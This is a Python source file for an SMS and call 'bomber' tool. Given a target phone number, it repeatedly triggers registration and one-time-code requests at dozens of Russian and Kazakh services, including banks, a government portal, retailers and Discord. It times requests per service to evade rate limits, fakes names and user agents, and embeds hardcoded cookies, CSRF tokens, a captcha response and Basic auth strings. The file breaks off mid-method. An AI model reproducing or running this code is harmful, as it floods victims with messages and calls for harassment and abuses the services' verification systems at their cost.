from data import user_agent, email, ru_name
from bs4 import BeautifulSoup as Bs
from datetime import datetime as dt
from threading import Thread
from timedelta import Timedelta
from time import sleep
import hashlib
import requests
import random

def default_headers() -> dict:
    return {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'User-Agent': user_agent()}


requests.packages.urllib3.disable_warnings()
session = requests.Session()
session.headers = default_headers()
proxies = list()

"""def parse():
    global proxies
    while True:
        proxies = list()
        try:
            request = requests.get('https://free-proxy-list.net/')
            content = request.text.splitlines()
            proxy_list = content[13:313]
            for proxy in proxy_list:
                form = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
                try:
                    if requests.get('http://google.com', proxies=form, timeout=1).ok:
                        proxies.append(form)
                    elif requests.get('https://google.com', proxies=form, timeout=1).ok:
                        proxies.append(form)
                except:
                    pass
            if not len(work_proxies) > 2:
                proxies = [None]

        except:
            return None
        sleep(600)"""


def post(url, **kwargs):
    try:
        return requests.post(url, **kwargs, timeout=3)
    except:
        pass

def get(url, **kwargs):
    try:
        return requests.get(url, **kwargs, timeout=3)
    except:
        pass


def pformat(phone: str, mask: str, mask_symbol: str = "*", formatted_phone: str = '') -> str:
    for symbol in mask:
        if symbol == mask_symbol:
            formatted_phone += phone[0]
            phone = phone[(len(phone) - 1) * -1:]
        else:
            formatted_phone += symbol
    return formatted_phone


class Bomber:
    def __init__(self, phone):
        self.phone = phone
        self.pphone = '+'+self.phone
        name = list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
        self.password = "".join(random.choices(name, k=12))
        self.username = "".join(random.choices(name, k=12))
        self.name = "".join(random.choices(name, k=12))
        self.email = f'{self.name}@gmail.com'
        self.android_headers = {"X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive", "Pragma": "no-cache", "Cache-Control": "no-cache", "Accept-Encoding": "gzip, deflate, br", 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'DNT': '1'}
        self.services = [
            {'func': self.privet_mir, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.askona, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.pochta_bank, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.srochnodengi, 'timeout': 180, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.n1, 'timeout': 300, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.gloria, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.ffriend, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 86400, 'expired_time': None},
            {'func': self.tinkoff, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.olenta, 'timeout': 120, 'max_attempts': 8, 'attempts': 0, 'attempts_time': 46800, 'expired_time': None},
            {'func': self.lenta, 'timeout': 30, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.youla, 'timeout': 30, 'max_attempts': 2, 'attempts': 0, 'attempts_time': 600, 'expired_time': None},
            {'func': self.mcdonald, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.sushibox, 'timeout': 120, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.pizzabox, 'timeout': 120, 'max_attempts': 2, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.nalog, 'timeout': 120, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.boy, 'timeout': 120, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.apteka, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.mtstv, 'timeout': 15, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.citylink, 'timeout': 60, 'max_attempts': 3, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.dodopizza, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.AituPass, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.AptekaRu, 'timeout': 120, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.AptekaOtSklada, 'timeout': 180, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.BCS, 'timeout': 30, 'max_attempts': 3, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.belkacar, 'timeout': 60, 'max_attempts': 2, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.rabotaru, 'timeout': 300, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.checstyznak, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.choco, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.citydrive, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.discord, 'timeout': 30, 'max_attempts': 4, 'attempts': 0, 'attempts_time': 120, 'expired_time': None},
            {'func': self.goldapple, 'timeout': 60, 'max_attempts': 11, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.gosuslugi, 'timeout': 60, 'max_attempts': 4, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.hice, 'timeout': 40, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.indriver, 'timeout': 60, 'max_attempts': 2, 'attempts': 0, 'attempts_time': 1800, 'expired_time': None},
            {'func': self.kari, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 1800, 'expired_time': None},
            {'func': self.kazaexpress, 'timeout': 30, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.megafon, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.megafon_bank, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.megafon_tv, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.meloman, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.melzdrav, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.moezdorovie, 'timeout': 600, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.mosmetro, 'timeout': 300, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.ok, 'timeout': 100, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None}
        ]
        self.call = [{'func': self.berizaryad, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
                     {'func': self.farfor, 'timeout': 40, 'max_attempts': 6, 'attempts': 0, 'attempts_time': 180, 'expired_time': None},
                     {'func': self.farfor, 'timeout': 90, 'max_attempts': 4, 'attempts': 0, 'attempts_time': 350, 'expired_time': None},
                     {'func': self.mbk, 'timeout': 60, 'max_attempts': 1, 'attempts': 0, 'attempts_time': 7200, 'expired_time': None},
                     {'func': self.mfc, 'timeout': 360, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
                     {'func': self.newtel, 'timeout': 60, 'max_attempts': 2, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None}
                     ]
        self.lite_services = [
            {'func': self.privet_mir, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.askona, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.pochta_bank, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.srochnodengi, 'timeout': 180, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.n1, 'timeout': 300, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.gloria, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.ffriend, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 86400, 'expired_time': None},
            {'func': self.tinkoff, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.tinkoff, 'timeout': 120, 'max_attempts': 8, 'attempts': 0, 'attempts_time': 46800, 'expired_time': None},
            {'func': self.lenta, 'timeout': 30, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.youla, 'timeout': 30, 'max_attempts': 2, 'attempts': 0, 'attempts_time': 600, 'expired_time': None},
            {'func': self.mcdonald, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.sushibox, 'timeout': 120, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.pizzabox, 'timeout': 120, 'max_attempts': 2, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.nalog, 'timeout': 120, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.boy, 'timeout': 120, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.apteka, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.mtstv, 'timeout': 15, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None},
            {'func': self.citylink, 'timeout': 60, 'max_attempts': 3, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.dodopizza, 'timeout': 60, 'max_attempts': 5, 'attempts': 0, 'attempts_time': 3600, 'expired_time': None},
            {'func': self.AituPass, 'timeout': 60, 'max_attempts': 0, 'attempts': 0, 'attempts_time': 0, 'expired_time': None}]

    def start_call(self):
        for index, service in enumerate(self.call):
            if service['func'] == self.berizaryad:
                if service['expired_time'] is None or dt.now() >= service['expired_time']:
                    self.call[0]['expired_time'] = Timedelta(seconds=service['func']()) + dt.now()
            else:
                if service['expired_time'] is None or dt.now() >= service['expired_time']:
                    service['func']()
                    if service['max_attempts'] == 0:
                        self.call[index]['expired_time'] = dt.now() + Timedelta(seconds=service['timeout'])
                    else:
                        if service['attempts'] + 1 >= service['max_attempts']:
                            self.call[index]['attempts'] = 0
                            self.call[index]['expired_time'] = dt.now() + Timedelta(seconds=service['attempts_time'])
                        else:
                            self.call[index]['attempts'] = service['attempts'] + 1
            sleep(5)

    def start(self):
        for index, service in enumerate(self.services):
            if service['expired_time'] is None or dt.now() >= service['expired_time']:
                service['func']()
                if service['max_attempts'] == 0:
                    self.services[index]['expired_time'] = dt.now() + Timedelta(seconds=service['timeout'])
                else:
                    if service['attempts'] + 1 >= service['max_attempts']:
                        service['attempts'] = 0
                        self.services[index]['expired_time'] = dt.now() + Timedelta(seconds=service['attempts_time'])
                    else:
                        service['attempts'] = service['attempts'] + 1

    def start_lite(self):
        for index, service in enumerate(self.lite_services):
            if service['expired_time'] is None or dt.now() >= service['expired_time']:
                service['func']()
                if service['max_attempts'] == 0:
                    self.lite_services[index]['expired_time'] = dt.now() + Timedelta(seconds=service['timeout'])
                else:
                    if service['attempts'] + 1 >= service['max_attempts']:
                        service['attempts'] = 0
                        self.lite_services[index]['expired_time'] = dt.now() + Timedelta(
                            seconds=service['attempts_time'])
                    else:
                        service['attempts'] = service['attempts'] + 1

    def privet_mir(self):
        post('https://api-user.privetmir.ru/api/v2/send-code', data={'checkApproves': 'Y', 'approve1': 'on', 'approve2': 'on', 'back_url': '', 'scope': 'register-user reset-password', 'login': pformat(self.phone, '+* (***) ***-**-**')}, headers=default_headers())

    def askona(self):
        get(f'https://www.askona.ru/api/registration/sendcode?csrf_token=aa2cb52dad3a89cb083d36a5b62bef10&contact%5Bphone%5D={self.phone}', headers={**default_headers(), **{'referer': 'https://www.askona.ru/'}}, cookies={'BITRIX_SM_SALE_UID': '190914567', '_gcl_au': '1.1.897406430.1637066453', 'tmr_lvid': 'c90ee0ba62d62303dd009c5e53a880b6', 'tmr_lvidTS': '1634435346198', '_userGUID': '0:kw233jlh:yOnDtGz8erhED3t5o36UvJdjBKOxq~zz', '_wid': '42e7ioP4XJlQL4BPkPgO', '_ct': '1400000000184890806', '_ct_client_global_id': '3fadd797-242b-5408-bf8d-1fbcf44ea1cb', 'rrpvid': '934476831298892', '_ym_d': '1637066455', '_ym_uid': '16344353481015352590', 'rcuid': '6040d4374bb29900014fba2e', 'flocktory-uuid': '83c6524d-9ed6-4159-98e1-ef01181bde78-9', '_acfId': 'eaf7a843-a2a4-48f8-a893-d9f8885e14db', 'PHPSESSID': 'S6lGFMoYaald9RW%2C15-brI0TwfDrIRQAo1HI0jUFI6BxCXWiUd', 'BITRIX_SM_PK': '457ed93f46978385969e18ff6e57ed3f', 'BITRIX_SM_LOCATION_CODE': '2791', 'kameleoonVisitorCode': '_js_vl18kcan8xcp0bj1', 'select-city': 'true', '_ga': 'GA1.2.1530433373.1637066453', '_gid': 'GA1.2.1428970080.1638060522', 'dSesn': '9c880efd-ce29-2f31-0584-fa51acdd8ded', '_dvs': '0:kwiixw4s:_w0tFVWy7uH30ucl3Dl4ghn9dg8uTG89', 'cted': 'modId%3D5tfjfgj3%3Bclient_id%3D1530433373.1637066453%3Bya_client_id%3D16344353481015352590%7CmodId%3Dvwgixinz%3Bclient_id%3D1530433373.1637066453%3Bya_client_id%3D16344353481015352590', 'tmr_detect': '1%7C1638060522319', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1638133140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', '_gat_UA-17566875-1': '1', '_gat_wtracker': '1', '_ct_ids': 'vwgixinz%3A38342%3A261374990', '_ct_site_id': '38342', '_ct_session_id': '261374990', 'call_s': '%3C!%3E%7B%22vwgixinz%22%3A%5B1638062320%2C261374990%2C%7B%22155456%22%3A%22627039%22%7D%5D%2C%22d%22%3A2%7D%3C!%3E', '_gat_UA-17566875-3': '1', '_gat_%5Bobject%20Object%5D': '1', 'tmr_reqNum': '33', '_ym_isad': '1', '_acfVisit': '2', 'cto_bundle': 'o1v8tl9CcUNXM2JROUZuME9TQWluWUdsOE9tYTJxNXlFRCUyQms0VE5Ic1c3cW1YakglMkJFMXFqdllMb2JBUTR1MDRCZnFJSG56T2pzR0xpQVlSN3NsV0kyMFFpSnRPQ0JROE13SCUyQk9iU3NLbkVLR3RwVmRoYm00JTJCRGcybEhPVGU0aEVxUWpaQjclMkZObjZQcWY4blNpYklvcEsxS1JBJTNEJTNE', '_ga_21M08Q47LQ': 'GS1.1.1638060521.2.0.1638060526.55'})

    def pochta_bank(self):
        try:
            session.headers = default_headers()
            session.post('https://my.pochtabank.ru/dbo/registrationService/ib')
            session.put('https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber', json={"confirmation": "send", "phone": pformat(self.phone, '+* (***) ***-**-**')})
        except:
            pass

    def srochnodengi(self):
        post('https://mapi-order.srochnodengi.ru/api/v1/auth/landing/send-sms/', data={'lead': None, 'phone': pformat(self.phone, '+* (***) *** - ** - **')}, headers=default_headers())

    def quiqrestro(self):
        post('https://quickresto.ru/api_controller/?module=sms&method=sendRegistrationCode', json={'phone': self.pphone}, headers=default_headers())

    def n1(self):
        post('https://tver.n1.ru/service/Users/register', json={"login": self.pphone, "password": self.password, "domain": "tver.n1.ru", "type": "owner"})
        post('https://tver.n1.ru/service/Users/resendCode', json={'login': self.pphone})

    def gloria(self):
        post('https://www.gloria-jeans.ru/phone-verification/send-code/registration', json={'phoneNumber': '+' + self.phone})
        post('https://www.gloria-jeans.ru/phone-verification/send-code-for-login', json={'phoneNumber': '+' + self.phone})

    def ffriend(self):
        post('https://familyfriend.com/graphql', json={"query": "mutation AuthEnterPhoneMutation($input: RequestSignInCodeInput!) {\n  result: requestSignInCode(input: $input) {\n    ... on ErrorPayload {\n      message\n      __typename\n    }\n    ... on RequestSignInCodePayload {\n      codeLength\n      __typename\n    }\n    __typename\n  }\n}\n", "operationName": "AuthEnterPhoneMutation", "variables": {"input": {"phone": self.phone}}})

    def tinkoff(self):
        post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" + self.phone}, headers=default_headers())

    def olenta(self):
        post('https://id.x5.ru/graphql', json={"query": '{ user_credentials(login:"' + self.phone + '") {login}}'})
        post('https://online.lenta.com/api.php', data={'tel': pformat(self.phone, '+* (***) ***-**-**')}, headers=default_headers())

    def lenta(self):
        post('https://lenta.com/api/v1/registration/requestValidationCode', json={'phone': self.phone}, headers={**{'Host': 'lenta.com', 'Origin': 'https://lenta.com', 'Referer': 'https://lenta.com/npl/authentication/'}, **default_headers()})

    def youla(self):
        post('https://youla.ru/web-api/auth/request_code', cookies={'tmr_lvid': '977a8377e5cce3f740a399c4a6ebafb0'}, json={'phone': self.phone}, headers={**{'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Cookie': 'tmr_reqNum=69', 'Host': 'youla.ru', 'Pragma': 'no-cache', 'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()}, **{'X-Youla-Json': '{"lvid":"977a8377e5cce3f740a399c4a6ebafb0"}'}})

    def mcdonald(self):
        post('https://site-api.mcdonalds.ru/api/v1/user/login/phone', json={"number": self.pphone, "g-recaptcha-response": "03AGdBq24VZzz6ZdGiBJtPMdrCTJcVR-NHlto4LWq2COdZlAYu3iDTcwVnkIDi5YMTyfcsoFYpBsMuZDMi5QKAaIqGVIoLdEKlBg-VTVyrNRk2Xl73gzaorOAY0amGmAzprdmCbUVW6ficToPzqW0HNXfKVyWgeLg6OrX0EYBbynwxFt5EjZ-ETGp8dUEnB9D4O4bfjxYi1bLlc5DiC5nPS6HsEr0jT3ptDFYiPGB6gst353VcCsdqS6mWWM4V-Zzjg-8t6hi1R7nYLF0LCAeY6TLbQXNtgGw3LTv9KW6FjZ7PDV86JlGoXLcPkQbWcUDHRzR29AnjccR5YqzKCs-MGQoyWQUBJVaokRLV7wfNkS6hW1E7U1vA8cHpC6mN3jEZ-FsMMZILNQl62a_ixbgRTA3ccgLhJbUlMy2YqJQn8j6l7miJH2fyGC4A7UxfMEpeZJ_myojoZORp"})

    def sushibox(self):
        post('https://sbguest.sushibox.org/api/v1/users/webauthorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfN', json={'phone': self.phone})

    def pizzabox(self):
        post('https://pizzabox.ru/?action=auth', data={'CSRF': None, 'ACTION': 'REGISTER', 'MODE': 'PHONE', 'PHONE': pformat(self.phone, '+* (***) ***-**-**'), 'PASSWORD': self.password, 'PASSWORD2': self.password})

    def nalog(self):
        post('https://lkdr.nalog.ru/api/v1/auth/challenge/sms/start', json={'phone': self.phone}, headers=default_headers())

    def boy(self):
        try:
            token = Bs(session.get('https://broniboy.ru/moscow/').content, 'html.parser').select('meta[name=csrf-token]')[0]['content']
            session.post('https://broniboy.ru/ajax/send-sms', data={'phone': pformat(self.phone, '+* (***) ***-**-**'), '_csrf': token}, headers={'X-CSRF-Token': token, 'X-Requested-With': 'XMLHttpRequest'})
        except:
            pass

    def apteka(self):
        try:
            session.get('https://b-apteka.ru/lk/login', headers=self.android_headers)
            session.post('https://b-apteka.ru/lk/send_confirm_code', json={'phone': self.phone}, cookies=session.cookies, headers=self.android_headers)
        except:
            pass

    def mtstv(self):
        post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": self.phone}, headers=default_headers())

    def citylink(self):
        post(f'https://www.citilink.ru/registration/confirm/phone/+{self.phone}/', headers=default_headers())

    def dodopizza(self):
        post('https://dodopizza.kz/api/sendconfirmationcode', data={'phoneNumber': self.phone}, headers=default_headers())

    def AituPass(self):
        post('https://passport.aitu.io/api/v1/sms/request-code', json={'phone': self.pphone})

    def AptekaRu(self):
        post("https://api.apteka.ru/Auth/Auth_Code", json={'phone': self.pphone}, headers={'User-Agent': 'Android_Apteka/3.2.12 (Redmi Note 7, Ver 10, Density 2.625)'})

    def AptekaOtSklada(self):
        post("https://apteka-ot-sklada.ru/api/auth/request", json={'phone': self.phone}, headers={**default_headers(), **{'referer': "https://apteka-ot-sklada.ru/"}}, cookies={'view': 'cells', 'rrpvid': '24619267054741', '_ym_uid': '1636286951705640313', '_ym_d': '1636286951', '_userGUID': '0:kvp703r5:SMXe9bUHp0EH7rSESSEl5f0Cok3so0~f', 'dSesn': '5f508f7e-3233-c0ad-9615-da80eeb230d9', '_dvs': '0:kvp703r5:ObGEZ0XDeSbtbpM5Jj2VUiyZMqb4Ew9O', 'rcuid': '61599a1653897c0001d741da', '_ym_visorc': 'w', '_fbp': 'fb.1.1636286951447.1474107645', '_ga': 'GA1.2.183591085.1636286952', '_gid': 'GA1.2.1930335220.1636286952', '_gat_gtag_UA_65450830_1': '1', '_ym_isad': '2', 'mark': '7967c245-86b4-40c8-afb5-7fbf3359583d', 'rrwpswu': 'true'})

    def BCS(self):
        post('https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token', data={"client_id": "broker_otp_guest2", "grant_type": "password", "username": self.phone})

    def belkacar(self):
        post("https://api.belkacar.ru/v2.12-covid19/auth/get-code", data={'phone': self.phone, "device_id": 'null'})

    def berizaryad(self):
        try:
            return post("https://mobileapi.berizaryad.ru/auth", json={'password': self.password, "phone": self.phone, "verification_method": "call_last4"}).json()['data']['attributes']["sms-attempts"]["next-event-wait"]
        except:
            return 180

    def rabotaru(self):
        post('https://chernovtsy.rabota.ru/api-web/v6/code/send.json', json={"request": {"login": self.phone}, "request_id": random.randrange(10000000, 99999999), "application_id": 13, "rabota_ru_id": "61ac6204606974005985032667545210", "user_tags": [{"id": 0, "add_date": "2021-12-05", "name": "hr_banners_show"}, {"id": 0, "add_date": "2021-12-05", "name": "hr_login_form_spa"}, {"id": 0, "add_date": "2021-12-05", "name": "courses_widget_control1"}, {"id": 0, "add_date": "2021-12-05", "name": "profession_widget_target"}, {"id": 0, "add_date": "2021-12-05", "name": "main_page_careers_story2_control1"}, {"id": 0, "add_date": "2021-12-05", "name": "search_exclude_reloc2_target"}, {"id": 0, "add_date": "2021-12-05", "name": "use_vwo_service"}, {"id": 0, "add_date": "2021-12-05", "name": "hr_new_scheduled_action_list_active"}]})

    def checstyznak(self):
        post("https://mobile.api.crpt.ru/mobile/login", json={'phone': self.phone}, headers=default_headers())

    def choco(self):
        post("https://api-proxy.choco.kz/user/v2/code", data={'login': self.phone, "client_id": "-5", "dispatch_type": "call"}, headers=default_headers())

    def citydrive(self):
        post("https://cs-v2.youdrive.today/signup", json={"os": "android", 'phone': self.phone[1:], 'phone_code': '7', "token": "null", "token_type": "fcm", "vendor_id": "null"}, headers={"User-Agent": "carsharing/4.1.1 (Linux; Android 11; M2010J19SY Build/REL)"})

    def discord(self):
        post("https://discord.com/api/v9/auth/register/phone", json={'phone': self.pphone})

    def farfor(self):
        post("https://api.farfor.ru/v2/auth/signup/order-code/by-call/", json={'phone': pformat(self.phone, "+* (***) ***-**-**"), "city_id": '1', "repeated": 'true', "city_type": 'city'}, headers={"platform": "android", "uuid": "None", "User-Agent": "FarFor/21.01.04 (None; android 11) okhttp/3.12.1"})

    def goldapple(self):
        post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json={'phone': self.phone})

    def gosuslugi(self):
        post("https://www.gosuslugi.ru/auth-provider/mobile/register", json={"instanceId": "123", "firstName": random.choice(ru_name), "lastName": random.choice(ru_name), "contactType": "mobile", "contactValue": pformat(self.phone, "+*(***)*******")})

    def grilnica(self):
        get(f"https://api.grilnica.ru/store/api/client/phone-confirmation-token/send/{self.pphone}", headers={"authorizationClient": "Basic c2l0ZTphRWRTQSNmZg==", 'version': '1.8', "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0"})

    def hice(self):
        post("https://api.hicebank.ru/api/v1.7/auth/code/", json={'phone_number': self.phone, "delivery_option": "SMS", 'install_id': 'null'})

    def indriver(self):
        post('https://rukzbrothers.ru/api/authorization?locale=ru_RU', data={'phone': self.phone[1:], "mode": "request", "phoneCode": '+7', "countryIso": "RU", "phone_permission": "unknown", "stream_id": "0", "v": "7", "imei": "", "regid": "", "appversion": "3.26.0", "osversion": "kal", "devicemodel": "kal"}, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 3 Build/QQ3A.200905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36"})

    def kari(self):
        get("https://i.api.kari.com/ecommerce/client/registration/verify/phone/code", params={'phone': self.pphone}, headers=default_headers())

    def kazaexpress(self):
        post("https://api.kazanexpress.ru/api/restore", json={'login': self.phone}, headers={"User-Agent": "KazanExpress/Android (com.kazanexpress.ke_app; 1.4.5)", "Authorization": "Basic a2F6YW5leHByZXNzLWFuZHJvaWQ6YW5kcm9pZFNlY3JldEtleQ=="})

    def mbk(self):
        post("https://www.mbk.ru/recall-send", data={'phone': pformat(self.phone, "+* *** *** ** **"), 'name': random.choice(ru_name)}, headers={"x-csrf-token": "wHwdsu3nbvaKUrQlIv584X3TQIMoDdfw49w9O8ha", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36", "Cookie": "_ym_uid=1632239171836515994; _ym_d=1632239171; tmr_lvid=5e79609d1c2e5c684d07fbb86e45e683; tmr_lvidTS=1632239172549; k50uuid=eab04476-53a0-45e4-82fa-0953bf7a76eb; k50sid=44b5c786-23f4-4590-aa35-444f2fd9aa5f; _ga=GA1.2.954495202.1632239173; _gid=GA1.2.869577097.1632239173; _ym_isad=2; _ym_visorc=w; _fbp=fb.1.1632239173810.349487315; XSRF-TOKEN=eyJpdiI6Ijg4dU9hbnQzb3VnS2Z6Q1NzNmZva0E9PSIsInZhbHVlIjoiRllrbms2cWZDaVJ1SENFajkvWGlZazhPdTdHbHdMU0MvcUJodDhVUExrSFM3ZjQ1ZFdpbjNBMlIwT09DaTBzb2RVYlNtKzZBUEJkb3B6ZWJsQk1iMnEwMVdSck1tSjV3TzNzT01valRYRjZYakxBWFJ3Y2ZIdkk3eUdnRnl0dzYiLCJtYWMiOiIzZTVmZGI0ODA0MzcyYmZlN2Y2NjhhNmFhMjNjZDlmMGUxZGRkZjQyYjAwZGNlMGExM2MyMWM1ZTU4NDZlNTY4In0%3D; mbk_session=eyJpdiI6InZNZGZoT1Byd1Nta1MyTUQ4ZjRvaVE9PSIsInZhbHVlIjoiZHYvR09yVHJ1MjdQUjM1UVVNTHovNTU1cmFhNjJoWUpmUU5oZlNyNWJNbmtSbXNiVktMSHAwRlkvcUtkR3A2N2lsSTZoWDltRGszVEdPVjZJODY0My93R2w0aDlPOHE0MURxbWhXbXZpNmJFNmpQbmZ5WUVjZGVNZkxBbHd5ZlAiLCJtYWMiOiJhZDhjOWY4ZmNkZDA1OTJkMWE2ZTdiMDk4M2QyMzEwNjczZmE3MDcwZDIwMjZlYTU5OWRmNjNjYjFjMjA5Mjc1In0%3D; k50lastvisit=5e66b839b5fe87ac40628689c00d5d639267ca62.595c3cce2409a55c13076f1bac5edee529fc2e58.5e66b839b5fe87ac40628689c00d5d639267ca62.da39a3ee5e6b4b0d3255bfef95601890afd80709.1632239268849; 794791647935278_k50cookie=38807.67085.16322392565208; tmr_detect=0%7C1632239273973; tmr_reqNum=16"})

    def megafon(self):
        post("https://disk.megafon.ru/api/3/md_otp_tokens/", json={'phone': self.pphone})

    def megafon_bank(self):
